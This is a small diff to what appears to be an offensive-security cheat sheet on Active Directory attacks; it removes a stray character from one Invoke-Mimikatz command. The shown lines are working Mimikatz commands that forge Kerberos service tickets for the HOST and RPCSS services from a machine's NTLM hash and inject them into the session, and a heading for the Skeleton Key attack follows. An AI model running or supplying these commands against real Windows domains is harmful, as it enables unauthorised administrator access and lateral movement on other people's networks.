@@ -48,7 +48,7 @@ C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<dom
     /service:HOST /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
     
 # Privileges for RPCSS service
-C:> Invoke-Mimikatz -Command '0"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn>  
+C:> Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain_fqdn> /sid:<domain_sid> /target:<host_fqdn>  
     /service:RPCSS /rc4:<host_ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"'
 ```
 ### Skeleton Key
